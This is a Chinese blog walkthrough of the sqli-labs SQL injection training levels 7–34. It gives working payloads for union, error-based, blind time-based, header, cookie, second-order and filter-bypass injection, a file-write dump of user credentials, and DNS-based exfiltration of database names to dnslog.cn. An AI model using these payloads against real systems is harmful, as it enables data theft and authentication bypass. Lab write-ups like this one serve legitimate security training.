<h1 id="Less-7-文件读写"><a href="#Less-7-文件读写" class="headerlink" title="Less-7-文件读写"></a>Less-7-文件读写</h1><p>进入题目发现提示是Dump into Outfile，说明要用到文件的读写</p>
<h2 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h2><p>mysql的文件读写函数<strong>load_file</strong>函数与<strong>into outfile</strong>函数只有满足以下条件可以使用:</p>
<blockquote>
<p>当前连接的mysql用户为root权限<br>文件权限: chmod a+x pathtofile<br>文件大小: 必须小于max_allowed_packet</p>
</blockquote>
<p>文件的读写一般是要通过mysql配置文件的权限才可以使用的，5.5之前的版本是secure_file_priv变量 默认为空 所以直接就可以使用，但是高于5.5时mysql新出了一个secure-file-priv字段<br>所以我们需要更改一下mysql的配置文件，加一行</p>
<blockquote>
<p>secure_file_priv= </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207160905713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后重启一下mysql就可以了。(tips结束<br>进入题目后老方法</p>
<blockquote>
<p>id=1’ and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207161123726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">报错了，测试了一会后发现是这样闭合的</p>
<blockquote>
<p>id=1’)) and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207161223667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">提示使用outfile()函数<br>于是我们构造一个payload</p>
<blockquote>
<p>id=-1’)) union select 1,’这是放木马的’,3 into outfile ‘D:\1.php’ –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207161431162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">进D盘查看文件在不在<br><img src="https://img-blog.csdnimg.cn/2021020716160698.png"><br>然后写个木马进去查看用户名和密码试试</p>
<blockquote>
<p>id=-1’)) union select 1,(select group_concat(concat_ws(“—“,username,password)) from users),3 into outfile ‘D:\2.php’ –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207161721999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-8-基于’-的布尔盲注"><a href="#Less-8-基于’-的布尔盲注" class="headerlink" title="Less-8-基于’ 的布尔盲注"></a>Less-8-基于’ 的布尔盲注</h1><p>这题通过提示我们知道可以使用布尔注入，所以我想到了用dns回显来进行数据查看，这里推荐一个网站<a href="http://dnslog.cn/">http://dnslog.cn/</a><br>进入这个网站之后，点击<strong>Get SubDomain</strong>，可以得到一个dns地址<br><img src="https://img-blog.csdnimg.cn/2021020723174412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后编辑注入语句</p>
<blockquote>
<p>id=1’ and load_file(concat(“\\“,(database()),”.xk0cq2.dnslog.cn\1.txt”)) –+</p>
</blockquote>
<p>注入之后点击Refresh Record即可收到回显结果<br><img src="https://img-blog.csdnimg.cn/20210207232007455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-9-基于’-的时间盲注"><a href="#Less-9-基于’-的时间盲注" class="headerlink" title="Less-9-基于’ 的时间盲注"></a>Less-9-基于’ 的时间盲注</h1><p>根据提示我们可以知道，这题是基于时间的注入，所以我们可以使用延时注入<br>先构造payload</p>
<blockquote>
<p>id=1’ and if(length(database())&gt;5,sleep(5),1) –+</p>
</blockquote>
<p>这样，我们就可以通过浏览器的返回时间来判断数据库名的长度<br><img src="https://img-blog.csdnimg.cn/20210207232912577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p><img src="https://img-blog.csdnimg.cn/20210207232832546.png"></p>
<h1 id="Less-10-基于”-的时间盲注"><a href="#Less-10-基于”-的时间盲注" class="headerlink" title="Less-10-基于” 的时间盲注"></a>Less-10-基于” 的时间盲注</h1><p>这题与上图一样，可以使用延时注入，但是注入闭合点换成了”<br>构造payload</p>
<blockquote>
<p>id=1” and if(length(database())&gt;5,sleep(5),1) –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210207233611122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br><img src="https://img-blog.csdnimg.cn/20210207233637454.png"></p>
<h1 id="Less-11-基于’-的POST型注入"><a href="#Less-11-基于’-的POST型注入" class="headerlink" title="Less-11-基于’ 的POST型注入"></a>Less-11-基于’ 的POST型注入</h1><p>首先测试注入点</p>
<blockquote>
<p>id=1’ and 1=1 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210208113829324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现是password那块有问题，于是想到可能是–+注释被ban掉了<br>所以使用#注释</p>
<blockquote>
<p>id=1’ and 1=1 #</p>
</blockquote>
<p>成功<br><img src="https://img-blog.csdnimg.cn/2021020811392689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>然后是payload</p>
<blockquote>
<p>1’ or 1=1 #</p>
</blockquote>
<p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208114314457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-12-基于”-的POST型注入"><a href="#Less-12-基于”-的POST型注入" class="headerlink" title="Less-12-基于”) 的POST型注入"></a>Less-12-基于”) 的POST型注入</h1><p>看题目说是双引号，于是尝试构造payload</p>
<blockquote>
<p>1” ‘ or 1=1 #</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210208114615375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">查看报错，发现其实是”) 闭合<br>所以重新来一次</p>
<blockquote>
<p>1”) or 1=1 #</p>
</blockquote>
<p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208114706613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-13-基于’-的报错注入"><a href="#Less-13-基于’-的报错注入" class="headerlink" title="Less-13-基于’) 的报错注入"></a>Less-13-基于’) 的报错注入</h1><p>根据题目可以知道是基于) 的报错注入，于是构造测试payload，发现其实是’) 闭合</p>
<blockquote>
<p>1’) or 1=1 #</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210208115425692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>测试显示点发现，这题没有显示点</p>
<blockquote>
<p>-1’) union select 1,2 #</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210208115804234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">所以准备用报错注入</p>
<blockquote>
<p>-1’) union select updatexml(1,concat(“~”,user(),”—“),1) #</p>
</blockquote>
<p>注入成功<br><img src="https://img-blog.csdnimg.cn/2021020812002514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-14-基于”-的报错注入"><a href="#Less-14-基于”-的报错注入" class="headerlink" title="Less-14-基于”  的报错注入"></a>Less-14-基于”  的报错注入</h1><p>根据题目知道，这题是双引号闭合<br>于是构造payload</p>
<blockquote>
<p>1” or 1=1 #</p>
</blockquote>
<p>成功进入<br><img src="https://img-blog.csdnimg.cn/20210208120148961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>与上题一样，没有显示点</p>
<blockquote>
<p>-1” union select 1,2 #</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210208120244193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>于是使用报错注入</p>
<blockquote>
<p>-1” union select updatexml(1,concat(“<del>“,user(),”</del>“),1) #</p>
</blockquote>
<p>成功注入<br><img src="https://img-blog.csdnimg.cn/20210208120357507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-15-基于’-的POST型注入"><a href="#Less-15-基于’-的POST型注入" class="headerlink" title="Less-15-基于’ 的POST型注入"></a>Less-15-基于’ 的POST型注入</h1><p>根据提示可知，这题是用的布尔盲注，所以可以尝试使用dns传值<br>首先构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.rao80k.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021020911571117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210209115721303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">成功传值</p>
<h1 id="Less-16-基于”-的POST型注入"><a href="#Less-16-基于”-的POST型注入" class="headerlink" title="Less-16-基于”) 的POST型注入"></a>Less-16-基于”) 的POST型注入</h1><p>这题同上，可以用dns传值<br>构造一下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;) and load_file(concat(&quot;\\\\&quot;,(database()),&quot;.e8vwb8.dnslog.cn\\1.txt&quot;)) #</span><br></pre></td></tr></table></figure>
<p>tips：最开始用1”) 发现一直注入不成功<br>后来仔细看的时候突然发现mysql注入的值是username<br>前几题都能行，所以一时间没看出来ε = = (づ′▽`)づ<br><img src="https://img-blog.csdnimg.cn/20210209133959999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-17-基于’-的密码注入"><a href="#Less-17-基于’-的密码注入" class="headerlink" title="Less-17-基于’ 的密码注入"></a>Less-17-基于’ 的密码注入</h1><p>这题刚开始的时候用老套路在username那整了好一会，发现怎么都注入不成功，然后突然发现上方有一个[PASSWORD RESET]<br>才反应过来这题可能是从password中注入，老眼瞎了(ˇωˇ」∠)_<br>试着构造了一下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure>
<p>tips：这题使用了update函数，所以username得是正确的，这里以admin为例</p>
<p><img src="https://img-blog.csdnimg.cn/20210210111924293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-18-基于’-的user-agent报头文件注入"><a href="#Less-18-基于’-的user-agent报头文件注入" class="headerlink" title="Less-18-基于’ 的user-agent报头文件注入"></a>Less-18-基于’ 的user-agent报头文件注入</h1><p>这关不看源代码感觉还真不好整，瞎吉尔整了半天，结果一看源代码才知道是用user-agent报头文件注入的<em>(:3⌒ﾞ)</em><br>正好是第一次遇见这种类型题，去找了一下大致解法<br>由于锁username和password了，所以要先知道username和password才可以进行下一步<br>于是使用burpsuite爆破用户名和密码（这种方法其实并不实用<br><img src="https://img-blog.csdnimg.cn/20210210215719507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>爆破出用户名、密码，然后进行user-agent注入<br>这里给出payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,1,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021021022004258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-19-基于’-的referer报头文件注入"><a href="#Less-19-基于’-的referer报头文件注入" class="headerlink" title="Less-19-基于’ 的referer报头文件注入"></a>Less-19-基于’ 的referer报头文件注入</h1><p>这题跟上题一样，但是是referer的报头文件注入<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,updatexml(1,concat(0x7e,database(),0x7e),1)) #</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210210220649426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-20-基于’-的cookie注入"><a href="#Less-20-基于’-的cookie注入" class="headerlink" title="Less-20-基于’ 的cookie注入"></a>Less-20-基于’ 的cookie注入</h1><p>这题是真的整了好久，刚看到这题的时候我以为跟前几道报头注入的题一样，更改一下报头就行了，但是尝试了好一会发现不行。＿|￣|○<br>于是感觉可能是代码更改过了，跟前几题的代码不一样，所以去看了一下源代码，发现确实不一样了，闭合点改了，所以重新修改了一下payload交上去发现还是不行。(｀Д´*)<br>最后选择去看了看网上的payload，发现是因为这题username,password,submit都限定了，只要提交了username和password就进不去注入点，由于我是用burpsuite的重发器进行payload测试的，所以一直卡在那里。┐(￣ヮ￣)┌<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;&#39;union select 1,2,(updatexml(1,concat(0x7e,database(),0x7e),1)) #;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210210222517580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-21-基于’-的cookie注入"><a href="#Less-21-基于’-的cookie注入" class="headerlink" title="Less-21-基于’ 的cookie注入"></a>Less-21-基于’ 的cookie注入</h1><p>这关根据提示可以知道，是和20关一样是用cookie进行注入，于是构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210212161718460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">发现回显错误，并且是乱码，第一次遇到这种类型题，也不知道是为啥乱码。(:3_ヽ)_<br>于是决定去看一眼源代码，发现在交sql语句之前进行了一次base64解码才交到query的。<br><img src="https://img-blog.csdnimg.cn/20210212161934107.png"><br>所以拿payload去进行一次base64编码<br><img src="https://img-blog.csdnimg.cn/20210212162035826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后再交一次<br><img src="https://img-blog.csdnimg.cn/20210212162116623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">注入成功辣。</p>
<h1 id="Less-22-基于”-的cookie注入"><a href="#Less-22-基于”-的cookie注入" class="headerlink" title="Less-22-基于” 的cookie注入"></a>Less-22-基于” 的cookie注入</h1><p>这关和上一关一样，只不过注入语句从’) 变为了’ “<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210212162427239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-23-过滤注释符的GET注入"><a href="#Less-23-过滤注释符的GET注入" class="headerlink" title="Less-23-过滤注释符的GET注入"></a>Less-23-过滤注释符的GET注入</h1><p>这关跟第一关一样，是简单的GET注入，不过把注释符过滤掉了，但是我们可以选择用一个单引号把后边的那个单引号闭合一下就行了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39; union select 1,2,3 &#39; 1</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021021216480899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-24-基于’-的二次注入"><a href="#Less-24-基于’-的二次注入" class="headerlink" title="Less-24-基于’ 的二次注入"></a>Less-24-基于’ 的二次注入</h1><p>这一关的提示是二次注入，去看看万能的网友的解释，二次注入其实就是使用一个账户来更改其他账户的用户名和密码。<br>在看看pass-change的源代码，知道可以从update这里入手。<br>我们先新建一个带有注入效果的用户名<br><img src="https://img-blog.csdnimg.cn/20210212170757731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<p>然后登入更改密码<br><img src="https://img-blog.csdnimg.cn/20210212170831823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">然后就可以使用刚刚更改的密码登入admin的用户了<br><img src="https://img-blog.csdnimg.cn/20210212170911868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">最后解释下原理，这关二次注入的原理其实就是把使用一个带注释符的用户名<br>把原来的update sql注入语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; </span><br></pre></td></tr></table></figure>
<p>通过带有注释符的用户名变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39; -- - &#39; and password&#x3D;&#39;$curr_pass&#39; </span><br></pre></td></tr></table></figure>
<p>于是后面的password认证就被注释掉了<br>最后就变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;</span><br></pre></td></tr></table></figure>
<h1 id="Less-25-禁止and和or的注入"><a href="#Less-25-禁止and和or的注入" class="headerlink" title="Less-25-禁止and和or的注入"></a>Less-25-禁止and和or的注入</h1><p>这关进来后得到提示，我们的and 和 or 都被禁止了，所以可以考虑使用联合注入<br>这里是payload</p>
<blockquote>
<p>id=-1’ union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210214141956339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70" alt="="></p>
<h1 id="Less-25a-禁止and和or的注入"><a href="#Less-25a-禁止and和or的注入" class="headerlink" title="Less-25a-禁止and和or的注入"></a>Less-25a-禁止and和or的注入</h1><p>这关跟上一关一样，但是注入点改为了无限制注入<br>这里是payload</p>
<blockquote>
<p>id=-1 union select 1,2,3 –+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20210214142247503.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-26-过滤了空格和注释的注入"><a href="#Less-26-过滤了空格和注释的注入" class="headerlink" title="Less-26-过滤了空格和注释的注入"></a>Less-26-过滤了空格和注释的注入</h1><p>这关把空格和注释过滤掉了，所以我们可以选择使用单引号闭合后面的单引号<br>由于过滤and和or的机制是and = “”<br>所以我们可以这样子绕过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aandnd</span><br></pre></td></tr></table></figure>
<p>当里面的and被过滤成空了之后，两边合在一起就变成了一个新的and<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39;aandnd(updatexml(1,concat(0x7e,database(),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210214151612998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-27-过滤了union和select的注入"><a href="#Less-27-过滤了union和select的注入" class="headerlink" title="Less-27-过滤了union和select的注入"></a>Less-27-过滤了union和select的注入</h1><p>这关把union和select过滤掉了，但没啥事，我们前几关都在用报错注入，所以这一关也一样<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1&#39;and(updatexml(1,concat(0x7e,database(),0x7e),1))and&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210214155612387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-28-过滤了union和select的注入，且报错注入不可用"><a href="#Less-28-过滤了union和select的注入，且报错注入不可用" class="headerlink" title="Less-28-过滤了union和select的注入，且报错注入不可用"></a>Less-28-过滤了union和select的注入，且报错注入不可用</h1><p>这关是过滤了union和select的注入，所以进来第一时间想到了报错，结果发现报错不可用，因为报错点被注释掉了，查了查发现可以用转编码<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编码前</span><br><span class="line">-1&#39;) UnIon All Select (&#39;1&#39;),2,(&#39;3</span><br><span class="line">编码后</span><br><span class="line">999%27)%0AUnIon%0AAll%0ASelect%0A(%271%27),2,(%273</span><br><span class="line">tips：%0A是换行符</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210216140251280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-29-基于’-的字符型注入"><a href="#Less-29-基于’-的字符型注入" class="headerlink" title="Less-29-基于’ 的字符型注入"></a>Less-29-基于’ 的字符型注入</h1><p>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/202102161406411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-30-基于”-的字符型注入"><a href="#Less-30-基于”-的字符型注入" class="headerlink" title="Less-30-基于” 的字符型注入"></a>Less-30-基于” 的字符型注入</h1><p>这关跟上一关一样，但是变成了”<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021021614155615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-31-基于”-的字符型注入"><a href="#Less-31-基于”-的字符型注入" class="headerlink" title="Less-31-基于”) 的字符型注入"></a>Less-31-基于”) 的字符型注入</h1><p>这关也没过滤啥<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999&quot;) union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210217161755650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-32-基于’-的宽字节注入"><a href="#Less-32-基于’-的宽字节注入" class="headerlink" title="Less-32-基于’ 的宽字节注入"></a>Less-32-基于’ 的宽字节注入</h1><p>这关用反斜杠 / 把’ 和 “ 转义掉了，所以直接使用的话是不能闭合的，那么我们可以试一下宽字节注入<br>这里是payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218141253620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><p>这关跟上一关一样，只不过是用了php内的函数来进行反斜杠转义，也可以使用宽字节注入。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;999%df&#39; union select 1,2,3 %23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210218141554168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p>
<h1 id="Less-34-POST方式的宽字节注入"><a href="#Less-34-POST方式的宽字节注入" class="headerlink" title="Less-34-POST方式的宽字节注入"></a>Less-34-POST方式的宽字节注入</h1><p>这关也是宽字节注入，但是注入方式变为了POST型注入<br>这里是payload</p>
